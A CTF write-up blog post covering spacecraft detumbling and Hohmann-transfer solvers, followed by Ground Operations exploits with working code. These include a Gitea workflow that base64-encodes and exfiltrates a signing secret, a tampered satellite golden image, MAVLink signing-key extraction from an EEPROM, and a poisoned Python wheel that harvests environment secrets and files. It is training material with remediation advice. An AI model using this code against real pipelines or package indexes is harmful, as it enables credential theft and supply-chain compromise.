---
title: "STARPWN CTF 2026 Writeup Part 2: Orbital Mechanics, Spacecraft Detumbling & Ground Operations"
slug: "starpwn-ctf-2026-writeup-part-2"
description: "STARPWN CTF 2026 writeup part 2 covering seven challenges across Orbital Mechanics and Ground Operations: spacecraft detumbling by computing angular momentum L = I·ω and applying counter-torque capped at 0.98 N·m with a whole-second grid burn correction, Hohmann transfer phasing with vis-viva equation and synodic-rate wait-time derivation (the V2 variant removes the leaked-answer oracle making the math mandatory), Gitea Actions CI/CD secret exfiltration by pushing a malicious workflow that base64-encodes PROD_SIGNING_KEY to defeat log masking and commits it to a loot branch, NASA cFS golden image supply chain attack by replacing status-generator.py in a unsigned ZIP and triggering Power-On Reset, MAVLink 2 signing key extraction from an ArduPilot EEPROM at offset 0x1F80 followed by MAVLink FTP to download a flag JPEG, and an unpinned-dependency PyPI-style supply chain attack by publishing a poisoned cubesat-upstream-driver wheel at version 99.0.0 that exfiltrates the FLAG environment variable via a DEPLOY_SOLAR_PANEL command."
date: 2026-08-10T12:00:00Z
lastmod: 2026-08-10T12:00:00Z
draft: false
author: "CyberSecurity Elite Team"
categories: ["CTF Writeups"]
series: ["STARPWN CTF 2026"]
tags:
  - "starpwn ctf"
  - "starpwn ctf 2026"
  - "ctf writeup"
  - "space ctf"
  - "orbital mechanics"
  - "hohmann transfer"
  - "spacecraft detumbling"
  - "angular momentum"
  - "gitea actions"
  - "ci/cd exploitation"
  - "supply chain attack"
  - "mavlink"
  - "eeprom"
  - "nasa cfs"
  - "golden image"
  - "python package"
  - "unpinned dependency"
  - "mavlink signing"
  - "ardupilot"
  - "ctf 2026"
keywords:
  - "starpwn ctf 2026 writeup part 2"
  - "tumbling through space ctf writeup"
  - "time to intercept hohmann transfer ctf"
  - "vanguard orbital security gitea ctf"
  - "space infiltrations nasa cfs ctf"
  - "one to rule them all mavlink eeprom ctf"
  - "mission control supply chain ctf"
  - "hohmann transfer phasing orbit ctf"
  - "spacecraft detumbling angular momentum ctf"
  - "gitea actions secret exfiltration ctf"
  - "nasa cfs golden image supply chain attack"
  - "mavlink 2 signing key eeprom extraction"
  - "unpinned dependency pypi ctf exploit"
  - "ardupilot eeprom key ctf"
  - "ground operations space ctf 2026"
toc: true
cover:
  image: "/images/articles/starpwn-ctf-2026-writeup-part-2.png"
  alt: "STARPWN CTF 2026 writeup part 2 — orbital mechanics, spacecraft detumbling, ground operations, MAVLink, supply chain"
---

**STARPWN CTF 2026** is a space-themed Jeopardy-style CTF that punishes teams who can only guess. Part 2 of this two-part writeup series covers the seven remaining challenges across the Orbital Mechanics and Ground Operations tracks — categories that demand real physics, genuine protocol knowledge, and creative supply-chain thinking. If you arrived here first, [Part 1 covers the OSINT, RF, and Misc tracks](/ctf-writeups/starpwn-ctf-2026-writeup-part-1/).

The seven challenges in this part span spacecraft attitude control (stopping a tumbling satellite using angular momentum arithmetic), two Hohmann transfer intercept problems where the second strips away the answer oracle to force you to derive the math, a Gitea Actions CI/CD secret-exfiltration chain, a NASA cFS golden-image supply-chain attack, an ArduPilot EEPROM signing-key extraction followed by MAVLink FTP, and a PyPI-style poisoned-wheel attack that exploits an unpinned dependency to exfiltrate the flag. Each challenge is self-contained below with a numbered attack chain, the exact solver logic, and a takeaway. Full scripts and supplementary figures live in the source repository at [Abdelkad3r/STARPWN-CTF-2026](https://github.com/Abdelkad3r/STARPWN-CTF-2026).

## Challenges covered in Part 2

| Challenge | Category | Points | Flag |
|---|---|---|---|
| Tumbling Through Space | Misc / Spacecraft Dynamics | 474 | `STARPWN{d3tumbl3_m4st3r_sp4c3_0p5}` |
| Time to Intercept | Misc / Orbital Mechanics | 476 | `STARPWN{h0hm4nn_tr4nsf3r_1nt3rc3pt}` |
| Time to Intercept V2 | Misc / Orbital Mechanics | 498 | `STARPWN{dont_print_th3_answer_}` |
| Vanguard Orbital Security | Ground Operations | 497 | exfiltrated PROD_SIGNING_KEY (dynamic) |
| Space Infiltrations | Ground Operations | 496 | `STARPWN{9de48ee5d75bd14b45e48948f5b74914}` |
| One to Rule Them All | Ground Operations / MAVLink | 500 | `starpwn{machines_never_pledged_to_be_allegiant}` |
| Mission Control | Ground Operations / Supply Chain | 490 | `STARPWN{7h20u9h_v1c702y_my_ch41n5_423_820k3n}` |

---

## Tumbling Through Space (Misc / Spacecraft Dynamics, 474 pts)

> `STARPWN{d3tumbl3_m4st3r_sp4c3_0p5}`

### The scenario

A satellite has lost attitude control and is spinning uncontrollably. You connect to a netcat service that provides real-time telemetry — the spacecraft's moments of inertia (I) and current angular velocity vector (ω) — and you must submit thruster torque commands to bring the angular rate below 0.01 rad/s within five attempts per connection.

The physics is undergraduate rotational mechanics: angular momentum **L = I · ω**, and to cancel tumbling you apply a counter-torque **T = −L / t** over a burn duration t. The challenge enforces a maximum torque magnitude of 1.0 N·m per axis, so you have to choose your burn duration carefully.

### Attack chain

1. **Connect and receive telemetry.** The server sends moments of inertia and angular velocity in a structured text block. A `recv_until_prompt()` helper reads bytes until it sees either the input prompt or a `STARPWN{...}` pattern.

2. **Compute the angular momentum vector.** Either parse the server's explicit `L = [x, y, z]` line or reconstruct it component-wise: `L[i] = I[i] * ω[i]`. The signs matter — don't drop negatives.

3. **Choose thruster torque magnitude.** The thruster cap is 1.0 N·m. Apply a 2 % safety margin: set `|T| = 0.98 N·m`. The required burn time is then `t = |L| / 0.98`.

4. **Correct for the whole-second grid.** The simulator burns thrusters on a whole-second grid — it truncates fractional seconds rather than honouring continuous-time integration. If you submit `t = 6.029 s` it will only burn for 6 s, leaving a sawtooth residual in angular rate. Fix by rounding burn duration **up** to the next whole second: `t_rounded = ceil(t)`. The torque components remain at the computed values; only the duration is rounded.

5. **Submit and iterate.** The solver sends up to five torque+duration pairs per connection. After a successful detumble the server returns the flag in the output stream, which `recv_until_prompt()` captures.

### Solver sketch

```python
import socket, math, re

HOST, PORT = "0.cloud.chals.io", PORT_NUMBER

def recv_until_prompt(s):
    buf = b""
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        buf += chunk
        if b"Enter" in buf or re.search(rb"STARPWN\{[^}]+\}", buf):
            break
    return buf.decode(errors="replace")

def angular_momentum(telemetry):
    # Try parsing explicit L vector first; fall back to I*w product
    m = re.search(r"L\s*=\s*\[([^\]]+)\]", telemetry)
    if m:
        return [float(v) for v in m.group(1).split(",")]
    I = [float(x) for x in re.search(r"Inertia.*?\[([^\]]+)\]", telemetry).group(1).split(",")]
    w = [float(x) for x in re.search(r"Angular velocity.*?\[([^\]]+)\]", telemetry).group(1).split(",")]
    return [I[i] * w[i] for i in range(3)]

with socket.create_connection((HOST, PORT), timeout=15) as s:
    data = recv_until_prompt(s)
    for _ in range(5):
        L = angular_momentum(data)
        mag = math.sqrt(sum(v**2 for v in L))
        if mag < 1e-9:
            break
        T_mag = 0.98
        t = mag / T_mag
        t_burn = math.ceil(t)          # whole-second grid correction
        Tx = -L[0] / mag * T_mag
        Ty = -L[1] / mag * T_mag
        Tz = -L[2] / mag * T_mag
        cmd = f"{Tx:.9f} {Ty:.9f} {Tz:.9f} {t_burn}\n"
        s.sendall(cmd.encode())
        data = recv_until_prompt(s)
        flag = re.search(r"STARPWN\{[^}]+\}", data)
        if flag:
            print(flag.group())
            break
```

**Example values from a live run:** torques `(−0.407057291, −0.694677994, 0.558683136)` N·m for 6 s. The |ω| dropped from 0.417 rad/s to 0.002 rad/s (threshold: 0.01 rad/s).

### Takeaway

The whole-second grid quirk is the real puzzle. The physics is standard; the simulator behaviour is not documented. If your residual ω is consistently above zero but below threshold and converging slowly, the burn is getting truncated. Always ceil the duration when a physical simulator claims discrete time steps.

---

## Time to Intercept (Misc / Orbital Mechanics, 476 pts)

> `STARPWN{h0hm4nn_tr4nsf3r_1nt3rc3pt}`

### The scenario

A randomised intercept problem: you are given a chaser spacecraft in a circular orbit and a target in a higher circular orbit, along with the initial phase angle between them. You must output both the Hohmann transfer delta-v and the wait time before igniting the injection burn. Tolerances are ±10 m/s for Δv and ±60 s for wait time. Five attempts per connection, 12-second socket timeout.

The server provides: circular orbit radius r1 (km), target radius r2 (km), orbital periods T1 and T2 (minutes), circular velocity v_c1 (m/s), and initial phase angle φ0 (degrees).

### Physics derivation

**Step 1 — Derive the gravitational parameter.** Do not assume standard Earth μ = 3.986 × 10¹⁴ m³/s². The server uses a custom (or slightly perturbed) μ. Derive it from the data given: **μ = v_c1² × r1** (with r1 in metres and v_c1 in m/s). This gives the exact μ the server is using.

**Step 2 — Transfer ellipse semi-major axis.** The Hohmann transfer ellipse connects the two circular orbits: **a_t = (r1 + r2) / 2** (both in metres).

**Step 3 — Injection burn via vis-viva.** The speed at perigee of the transfer ellipse:

```
v_p = sqrt(μ × (2/r1 − 1/a_t))
Δv  = v_p − v_c1
```

**Step 4 — Required lead angle at injection.** For the target to be at r2 exactly when the chaser arrives, the target must be at an angular position ahead of the chaser by:

```
α_req = π × (1 − (a_t / r2)^1.5)
```

This is the Hohmann phasing angle expressed in radians (derived from Kepler's third law applied to the half-period of the transfer ellipse relative to the target period).

**Step 5 — Synodic angular rate.** The angular rate at which the target moves relative to the chaser while both are in their circular orbits:

```
ω_rel = 2π × (1/T1 − 1/T2)   [rad/min]
```

with periods in minutes.

**Step 6 — Wait time.** The wait time is how long it takes the geometry to reach the required lead angle:

```
wait = ((α_req − φ0_rad) mod 2π) / ω_rel   [minutes]
```

**Important sign convention.** Through failure feedback it became clear that the server defines φ0 as the target being ahead of the chaser (not behind). If your wait times are consistently off by a full synodic period, flip the sign of φ0_rad or compute `((α_req + φ0_rad) mod 2π)` instead.

### Attack chain

1. Connect (`socket.create_connection`, 12 s timeout).
2. Read the telemetry block and extract r1, r2, T1, T2, v_c1, φ0 with regex.
3. Compute μ = v_c1² × r1 (convert r1 from km to m first).
4. Run the closed-form steps above.
5. Submit `Δv` in m/s and `wait` in seconds (= wait_minutes × 60).
6. Parse response for flag or error feedback.

### Solver sketch

```python
import socket, math, re

HOST, PORT = "0.cloud.chals.io", 29347

def solve(telem):
    r1  = float(re.search(r"r1\s*=\s*([\d.]+)", telem).group(1)) * 1e3
    r2  = float(re.search(r"r2\s*=\s*([\d.]+)", telem).group(1)) * 1e3
    T1  = float(re.search(r"T1\s*=\s*([\d.]+)", telem).group(1))  # minutes
    T2  = float(re.search(r"T2\s*=\s*([\d.]+)", telem).group(1))
    vc1 = float(re.search(r"v_c1\s*=\s*([\d.]+)", telem).group(1))
    phi0 = float(re.search(r"phi.*?=\s*([-\d.]+)", telem).group(1))

    mu   = vc1**2 * r1
    at   = (r1 + r2) / 2
    vp   = math.sqrt(mu * (2/r1 - 1/at))
    dv   = vp - vc1

    alpha_req = math.pi * (1 - (at / r2)**1.5)
    phi0_rad  = math.radians(phi0)
    omega_rel = 2 * math.pi * (1/T1 - 1/T2)          # rad/min
    wait_min  = ((alpha_req - phi0_rad) % (2*math.pi)) / omega_rel
    wait_sec  = wait_min * 60

    return dv, wait_sec

with socket.create_connection((HOST, PORT), timeout=12) as s:
    data = b""
    while b"Enter" not in data:
        data += s.recv(4096)
    telem = data.decode(errors="replace")
    dv, wait = solve(telem)
    s.sendall(f"{dv:.3f} {wait:.3f}\n".encode())
    resp = s.recv(4096).decode(errors="replace")
    print(resp)
```

**Demonstrated accuracy:** Δv error 0.000 m/s, wait error 0.690 s — well within tolerances.

### Takeaway

Derive μ from the data; never hardcode it. The server can use any gravitational parameter it likes. The vis-viva equation and Kepler's third law are sufficient to close the problem analytically — no numerical integration required.

---

## Time to Intercept V2 (Misc / Orbital Mechanics, 498 pts)

> `STARPWN{dont_print_th3_answer_}`

### What changed

The V2 challenge runs on `nc 0.cloud.chals.io 13028` and is physically identical to V1 — same formulas, same tolerances (±10 m/s, ±60 s), same five-attempt limit. The single change: **V1 leaked the required answer in its grader output.** When you submitted a wrong value, V1 replied with lines like:

```
Required delta-v: 154.981 m/s
Your delta-v:     160.000 m/s
Error: 5.019 m/s  (within 10.000 m/s tolerance: NO)
```

That oracle let teams iterate toward the answer without understanding the physics. V2 prints **only the submitted values and pass/fail** — no required values, no error margins. The flag itself encodes what was patched: `STARPWN{dont_print_th3_answer_}`.

### Why this matters

If you solved V1 by trial-and-error using the oracle, V2 is blocked until you derive the math. If you solved V1 analytically, V2 is solved immediately — the same solver script connects to a different port and the flag drops in the first attempt.

**Demonstrated solution values:** Δv = 91.335 m/s, wait = 43,148.856 s (the scenario was randomised; your numbers will differ).

### Solver additions

The V2 solver includes a `revealed()` fallback that tries to parse the V1 oracle format — it is non-functional in V2 but harmless, and it makes the same solver script work for both challenges:

```python
def revealed(response):
    """Attempt to extract required values from V1 oracle leakage (no-op in V2)."""
    dv_m = re.search(r"Required delta-v:\s*([\d.]+)", response)
    wt_m = re.search(r"Required wait.*?:\s*([\d.]+)", response)
    if dv_m and wt_m:
        return float(dv_m.group(1)), float(wt_m.group(1))
    return None
```

Everything else — `parse_state()`, `compute()` — is identical to the V1 solver.

### Takeaway

Information leakage in grader feedback is an underappreciated vulnerability class in educational platforms. The fact that the intended solution is hard to derive without the oracle, and that the oracle was present in V1, suggests many teams reverse-engineered the answer rather than the physics. V2 enforces the intended learning path. The flag is a self-describing patch note.

---

## Vanguard Orbital Security (Ground Operations, 497 pts)

> Flag: the exfiltrated `PROD_SIGNING_KEY` value (dynamic per instance)

### Environment

A Gitea instance running a CI/CD pipeline. The pipeline is configured with `on: push: ["**"]` — it triggers on pushes to **any** branch. The `PROD_SIGNING_KEY` secret is passed as an environment variable to every workflow step. During initial reconnaissance, credentials for a `builddev` user were found in `~/.git-credentials` on the foothold machine.

**Decoy awareness:** The foothold environment contains `STARPWN{k1ck_1091c_70_7h3_cu28_4nd_d0_7h3_1mp0551813}`. This is an intentional distraction placed to trip teams who grab the first flag-shaped string they see. The real flag is the PROD_SIGNING_KEY that lives only inside the CI runner.

### Attack chain

1. **Clone the repository.** Using the `builddev` credentials from `~/.git-credentials`:

```bash
git clone http://builddev:<password>@<gitea-host>/challenges/build-service.git
cd build-service
```

2. **Craft the malicious workflow.** Create `.gitea/workflows/pwn.yml`. The key trick: Gitea's log masking filters the literal secret string from runner output, but it does **not** filter the base64 encoding of that string. Encoding the secret before printing defeats masking:

```yaml
name: pwn
on:
  push:
    branches: ["**"]

jobs:
  exfil:
    runs-on: ubuntu-latest
    env:
      PROD_SIGNING_KEY: ${{ secrets.PROD_SIGNING_KEY }}
    steps:
      - name: checkout
        uses: actions/checkout@v3

      - name: exfiltrate
        run: |
          ENCODED=$(echo -n "$PROD_SIGNING_KEY" | base64)
          git config user.email "pwn@pwn.local"
          git config user.name "pwn"
          git checkout -b loot || git checkout loot
          echo "$ENCODED" > signing_key.b64
          git add signing_key.b64
          git commit -m "loot"
          git push origin loot --force
```

3. **Push to trigger the pipeline.** Push to any branch (the wildcard trigger fires on all branches):

```bash
git checkout -b pwn
git add .gitea/workflows/pwn.yml
git commit -m "add workflow"
git push origin pwn
```

4. **Wait and retrieve.** After approximately 15 seconds the runner completes. Clone the `loot` branch and decode:

```bash
git clone http://builddev:<password>@<gitea-host>/challenges/build-service.git --branch loot loot-repo
cat loot-repo/signing_key.b64 | base64 -d
```

The decoded string is the PROD_SIGNING_KEY and is the flag.

### Automation

The `exploit.sh` script in the repository automates the full chain. A separate `ttyd_client.py` handles the foothold — it is a minimal stdlib-only Python WebSocket client for the `ttyd` terminal server running on the ground station. It implements full RFC 6455 WebSocket framing with client-side masking, frame parsing, the `ttyd` auth handshake, terminal resize negotiation, and arbitrary command execution over the resulting pseudo-terminal session.

### Remediation

- Restrict secrets to **protected branches** that require pull-request approvals before merge.
- Never expose repository-level secrets to pipeline triggers from all branches — scope to `main` / release branches only.
- Use short-lived scoped credentials instead of long-lived static secrets; rotate after each build.
- Enable branch protection rules so that `builddev` cannot push directly to the default branch without review.
- Audit CI/CD trigger expressions: `on: push: ["**"]` is almost always wrong in production.

### Takeaway

Wildcard push triggers combined with unrestricted secret injection are a CI/CD supply-chain antipattern. The base64-encoding bypass defeats naïve log masking — a pattern documented in GitHub Actions security research and equally applicable to Gitea, GitLab CI, and Jenkins. Any runner that receives a secret as an environment variable can exfiltrate it regardless of log sanitisation, as long as the runner can write to a persistent location the attacker can read.

---

## Space Infiltrations (Ground Operations, 496 pts)

> `STARPWN{9de48ee5d75bd14b45e48948f5b74914}`

### Environment

The YeetSat ground station controls a satellite running **NASA cFS** (core Flight System). The ground station exposes an API for uploading and downloading the satellite's **golden image** — a 7.4 MB ZIP archive containing the cFS source and mission files including `status-generator.py`. There is no signature verification, no authentication on the image endpoint, and no hash check on upload or download.

### Challenge files

The provided `challenge/golden-image/` directory contains:

- `status-generator.py` — the script the satellite runs at boot to downlink status
- `cfe_es_cfs_integration.h` — cFS executive service header
- Four status text files (`good-status.txt`, `degraded-status.txt`, `critical-status.txt`, `offline-status.txt`)
- `README.md` — deployment notes

**Original `status-generator.py` logic:** imports `nasa_cfs_api`, calls `get_status_code()` (returns 0–3), reads the corresponding status file from `/opt/`, and prints it. Falls back to `good-status.txt` if the API is unavailable.

### Attack chain

1. **Download the current golden image** from the ground station API:

```bash
curl -s http://<ground-station>/api/golden-image -o golden-image.zip
```

2. **Modify `status-generator.py`.** Add a `try/except` block that reads `/opt/flag.txt` and appends it to the status output. Wrapping in `try/except` ensures the script degrades gracefully if run on the ground station (which does not have `/opt/flag.txt`), preserving the main interface and avoiding import errors:

```python
# ... existing imports and get_status_code logic ...
def main():
    # Original logic preserved
    try:
        code = nasa_cfs_api.get_status_code()
    except Exception:
        code = 0
    status_files = ["good-status.txt","degraded-status.txt","critical-status.txt","offline-status.txt"]
    with open(f"/opt/{status_files[code]}") as f:
        print(f.read())
    # Injected payload
    try:
        with open("/opt/flag.txt") as fl:
            print(fl.read())
    except Exception:
        pass

if __name__ == "__main__":
    main()
```

3. **Repackage as modified ZIP.** The `build_image.py` script rebuilds the archive preserving file permissions (755 for `.py` files) and timestamps — a mismatch in either would fail the satellite's integrity pre-check:

```python
import zipfile, os, time

FIXED_MTIME = (2026, 1, 1, 0, 0, 0)

with zipfile.ZipFile("modified-golden-image.zip", "w", zipfile.ZIP_DEFLATED) as zf:
    for root, dirs, files in os.walk("golden-image"):
        for fname in files:
            path = os.path.join(root, fname)
            info = zipfile.ZipInfo(path, date_time=FIXED_MTIME)
            info.external_attr = 0o755 << 16
            with open(path, "rb") as f:
                zf.writestr(info, f.read())
```

4. **Upload the modified image:**

```python
import requests, json

with open("modified-golden-image.zip", "rb") as f:
    r = requests.post(
        "http://<ground-station>/api/golden-image",
        files={"file": ("golden-image.zip", f, "application/zip")}
    )
print(r.status_code, r.text)
```

5. **Trigger Power-On Reset.** Send the CFE ES Reset command to force the satellite to boot from the newly uploaded image:

```bash
curl -X POST http://<ground-station>/api/command \
     -H "Content-Type: application/json" \
     -d '{"command": "CFE_ES_RESET", "type": "POR"}'
```

6. **Poll for the flag.** After Power-On Reset the satellite takes 30–60 seconds to boot and downlink its first status message. Poll `/api/status` every 6 seconds with a 240-second timeout:

```python
import time, requests, re

for _ in range(40):
    r = requests.get("http://<ground-station>/api/status")
    flag = re.search(r"STARPWN\{[^}]+\}", r.text)
    if flag:
        print(flag.group())
        break
    time.sleep(6)
```

The flag appears in the status body once the satellite boots the modified image and executes `status-generator.py`.

### The `solve.py` script

`solve.py` orchestrates the entire chain end-to-end using only Python stdlib plus `requests`. It implements custom `multipart/form-data` encoding to handle the ZIP upload on ground-station endpoints that reject the `requests` default content-type boundary format.

### Takeaway

Unsigned golden images in embedded / spacecraft systems are a critical supply-chain risk. The attack primitive — download, modify, repackage, re-upload, trigger reboot — is identical to firmware attacks against consumer IoT devices, industrial PLCs, and satellite ground systems alike. The mitigations are standard but often skipped under schedule pressure: cryptographic signing of firmware artifacts, signature verification at load time (not just at upload time), and authenticated endpoints for image management.

---

## One to Rule Them All (Ground Operations / MAVLink, 500 pts)

> `starpwn{machines_never_pledged_to_be_allegiant}`

### Challenge assets

- `challenge/eeprom.bin` — 16 KiB ArduPilot AP_Param EEPROM binary
- Live service: a MAVLink interface fronting 5 ArduCopter vehicles that require **MAVLink 2 signed** authentication

### Step 1 — Extract the MAVLink 2 signing key from EEPROM

The ArduPilot AP_Param EEPROM format begins with a 4-byte header (`PA` magic + revision byte + flags). The `StorageKeys` region holds the MAVLink 2 signing key at a well-known offset. The key is preceded by a 4-byte magic value `0x3852FCD1` that marks the signing key record.

`extract_key.py` validates the EEPROM header then scans for the magic value. If found, it reads the 32 bytes immediately following. If the magic is absent (some firmware versions omit it), it falls back directly to offset `0x1F80`:

```python
import struct, sys

EEPROM_FILE  = "challenge/eeprom.bin"
KEY_MAGIC    = 0x3852FCD1
FALLBACK_OFF = 0x1F80
KEY_LEN      = 32

data = open(EEPROM_FILE, "rb").read()

# Validate header
assert data[:2] == b"PA", "Not an AP_Param EEPROM"
revision = data[2]
print(f"[+] EEPROM header OK, revision {revision}")

# Search for magic
pos = data.find(struct.pack("<I", KEY_MAGIC))
if pos != -1:
    key_offset = pos + 4
    print(f"[+] Magic found at 0x{pos:04X}, key at 0x{key_offset:04X}")
else:
    key_offset = FALLBACK_OFF
    print(f"[!] Magic not found, falling back to 0x{FALLBACK_OFF:04X}")

key_bytes = data[key_offset : key_offset + KEY_LEN]
key_hex   = key_bytes.hex()
print(f"[+] Signing key: {key_hex}")
```

**Extracted key:** `d4ee003d187614d9ffa24d20f58b448551c2cdc1e54cf42fc00bb86182249126` (32 bytes, hex).

`verify_key.py` confirms the key before using it: it opens a TCP connection to the MAVLink service, captures a signed MAVLink 2 frame, recomputes the 6-byte signature as `sha256(secret_key + frame_bytes + link_id + timestamp)[:6]`, and checks it matches the frame's signature trailer.

### Step 2 — MAVLink 2 signing protocol

**Critical prerequisite:** set `MAVLINK20=1` in the environment **before** importing `pymavlink`. The library defaults to MAVLink 1, which has no signing support.

```python
import os
os.environ["MAVLINK20"] = "1"
from pymavlink import mavutil
```

MAVLink 2 signed frames carry a 13-byte trailer appended after the CRC:

| Field | Size | Description |
|---|---|---|
| `link_id` | 1 byte | Link identifier |
| `timestamp` | 6 bytes (LE) | Microseconds since epoch / 64 |
| `signature` | 6 bytes | First 6 bytes of SHA-256 |

Signature computation:
```
signature = SHA256(secret_key + frame[STX..CRC] + link_id + timestamp)[:6]
```

### Step 3 — MAVLink FTP to retrieve the flag image

With the signing key in hand, `solve.py` authenticates to the MAVLink service and uses the **MAVLink FTP** protocol (message ID 110, `FILE_TRANSFER_PROTOCOL`) to browse the flight controller filesystem:

1. **LIST** the root directory → locate `DCIM/` subdirectory.
2. **LIST `DCIM/`** → identify `flag.jpg`.
3. **OPEN_RO** `DCIM/flag.jpg` → receive session handle.
4. **READ** in 239-byte chunks, advancing the offset until `EOF` is returned. A 20-miss retry threshold handles packet loss on the simulated RF link.
5. **TERMINATE** the session, reassemble the JPEG.

### The flag image

The downloaded JPEG shows skywritten text above **Allegiant Stadium in Las Vegas**: *"machines never pledged to be allegiant"* — a reference both to the stadium name and to the challenge title "One to Rule Them All" (implying control over machines that refuse allegiance).

### `figures.py`

`figures.py` in the repository generates an annotated diagram of the EEPROM binary layout — AP_Param header, parameter storage region, StorageKeys boundary at 0x1F00, the magic value at the detected offset, and the 32-byte key region — using only Python's `struct` and terminal output. Useful for teaching the format to teammates.

### Takeaway

Signing keys embedded in EEPROM are only as secure as the physical and logical access controls around the EEPROM image. In this challenge the binary was handed out as a challenge file — in a real-world scenario it might be extracted via UART, JTAG, or a firmware update package. Once the key is extracted, MAVLink 2 signing provides no protection because the attacker now possesses the pre-shared secret. The mitigations are hardware-backed key storage (TPM, secure element) and short-lived session keys derived from a public-key exchange rather than a static symmetric secret.

---

## Mission Control (Ground Operations / Supply Chain, 490 pts)

> `STARPWN{7h20u9h_v1c702y_my_ch41n5_423_820k3n}`

### Vulnerability

The challenge's flight application has an unconstrained dependency in `requirements.txt`:

```
cubesat-upstream-driver>=1.0.0
```

No pinned version, no hash pinning, no private package registry. Any package published to the public index with version ≥ 1.0.0 (and higher than the currently installed version) will be selected by pip's version resolver.

### Original application behaviour

`flight_app/main.py` imports `handle_command` from `cubesat_upstream_driver`. If the driver returns a truthy `driver_reply`, the app returns `TM|EVENT|COMMAND_ACK|{driver_reply}`. The `PING` and `STATUS` commands are handled internally; everything else is delegated to the driver.

### Attack chain

1. **Build the poisoned wheel** with `build_wheel.py`. The script is stdlib-only — no `setuptools`, no `wheel` package required. It:
   - Generates a `cubesat_upstream_driver/__init__.py` with the malicious `handle_command()` and a `_discover_secret()` helper.
   - Computes SHA-256 hashes for the `RECORD` file.
   - Builds a valid `.whl` (ZIP) with DEFLATE compression and a fixed build timestamp of `2026-01-01` to make the artifact reproducible.
   - Sets the version to `99.0.0` — this wins any `>=1.0.0` resolver match.

2. **Malicious `__init__.py` logic:**

```python
import os, glob

def _discover_secret():
    """Search common locations for FLAG/SECRET/TOKEN/KEY patterns."""
    for var, val in os.environ.items():
        if any(k in var.upper() for k in ("FLAG","SECRET","TOKEN","KEY")):
            return val
    for pattern in ("/app/**", "/opt/**", "/run/secrets/**", "/tmp/**"):
        for path in glob.glob(pattern, recursive=True):
            try:
                content = open(path).read()
                if "STARPWN{" in content:
                    return content.strip()
            except Exception:
                pass
    return None

def handle_command(cmd, *args, **kwargs):
    cmd = cmd.strip().upper()
    if cmd in ("DEPLOY_SOLAR_PANEL", "DIAG_SECRET"):
        return os.environ.get("FLAG", _discover_secret() or "FLAG_NOT_FOUND")
    if cmd == "DIAG_ENV":
        return str(dict(os.environ))
    if cmd.startswith("DIAG_READ"):
        path = cmd.split(None, 1)[1] if " " in cmd else "/etc/passwd"
        try:
            return open(path).read()
        except Exception as e:
            return str(e)
    return None
```

3. **Upload the wheel:**

```bash
curl -X POST http://<mission-control>/api/upload \
     -F "file=@cubesat_upstream_driver-99.0.0-py3-none-any.whl"
```

4. **Retrieve the artifact session ID:**

```bash
SESSION_ID=$(curl -s http://<mission-control>/api/artifacts | jq -r '.session_id')
```

5. **Trigger the build via WebSocket.** The CI pipeline resolves dependencies including the uploaded artifact:

```javascript
// solve.mjs (Node.js)
const ws = new WebSocket(`ws://${HOST}/ws/${SESSION_ID}`);
ws.on("open", () => ws.send("TRIGGER_BUILD"));
ws.on("message", (msg) => {
  if (msg.includes("BUILD_COMPLETE")) ws.send("DEPLOY_SOLAR_PANEL");
  if (msg.includes("TM|EVENT|COMMAND_ACK|")) {
    const flag = msg.match(/STARPWN\{[^}]+\}/)?.[0];
    if (flag) console.log(flag);
    ws.close();
  }
});
```

6. **Exfiltrate the flag.** `DEPLOY_SOLAR_PANEL` is routed to the malicious `handle_command()` which returns `os.environ.get("FLAG")` — the flag environment variable set by the challenge harness.

### Why `DEPLOY_SOLAR_PANEL`?

The command name is chosen to blend in with legitimate flight operations. An anomaly detection system scanning command logs for `DIAG_SECRET` or `EXFIL` would likely miss `DEPLOY_SOLAR_PANEL` appearing in telemetry. This is operational security for the attacker — a reminder that malicious packages in supply chains are designed to look inert.

### Takeaway

The mitigations for unpinned dependency attacks are well-known and still routinely ignored in aerospace and embedded software:

- **Pin every dependency to an exact version and a hash.** `cubesat-upstream-driver==1.2.3 --hash=sha256:abc123...` defeats version-confusion attacks entirely.
- **Use a private package repository** and mirror only audited packages into it. No public-index resolution in production builds.
- **Vendor dependencies** and commit them to the repository at a known-good state.
- **Scan the dependency graph** with tools like `pip-audit`, `safety`, or `Dependabot` before any build.

The `solve.mjs` script (Node.js) automates the full upload → trigger → deploy → extract flow in under 30 seconds.

---

## Cross-cutting lessons

**Derive, don't assume.** Both Hohmann challenges, the EEPROM extraction, and the EEPROM key verification all required deriving constants from given data rather than assuming standard values. The server uses custom μ values. The EEPROM uses a non-standard offset that must be confirmed by magic-value scanning. Hardcoded constants are a fast path to wrong answers.

**Simulators have implementation bugs that are part of the puzzle.** The whole-second grid in Tumbling Through Space is not documented — it is discovered through failure. When a physical model behaves unexpectedly (residual angular velocity that converges but stalls), examine the simulator's time-discretisation assumptions before blaming your math.

**Every CI/CD secret is potentially exfiltrable from any runner that receives it as an environment variable.** Log masking, variable substitution guards, and secret scanning are partial mitigations; they do not prevent a runner with arbitrary code execution from encoding and exporting the secret. The only robust defence is scope restriction: secrets should reach only the runners and branches that genuinely need them.

**Supply-chain attacks compound.** The Mission Control and Vanguard challenges both exploit trust relationships rather than technical memory-safety bugs. Supply-chain attacks are particularly dangerous in aerospace because the target systems often cannot be patched in flight — a poisoned golden image or a malicious dependency baked into a build artefact may persist for months or years.

**Flag-shaped strings are bait.** The `STARPWN{k1ck_1091c_...}` decoy in the Vanguard foothold environment is a reminder that CTF challenge designers read the same CTF write-ups you do. If the first flag-shaped string you find is too easy to reach, it is probably a decoy. Follow the challenge title's promise — "Vanguard Orbital Security" is about the CI/CD pipeline, not about the foothold box.

---

## FAQ

### What is the STARPWN CTF 2026 and when did it run?

STARPWN CTF 2026 is a space-themed, Jeopardy-style Capture the Flag competition focused on spacecraft systems, orbital mechanics, ground operations, RF communications, and OSINT. It ran in 2026 and is one of the few CTF events that requires real physics knowledge — Hohmann transfer equations, angular momentum, MAVLink protocol — rather than exclusively software-exploitation skills.

### How do you stop a tumbling spacecraft in the Tumbling Through Space challenge?

Compute the angular momentum vector **L = I · ω** from the telemetry (moments of inertia multiplied component-wise by angular velocity). Apply a counter-torque **T = −L / |L| × 0.98** (capped at 98% of the 1.0 N·m thruster limit) and burn for `t = |L| / 0.98` seconds, rounded up to the next whole second to compensate for the simulator's whole-second burn grid.

### What is the difference between Time to Intercept V1 and V2?

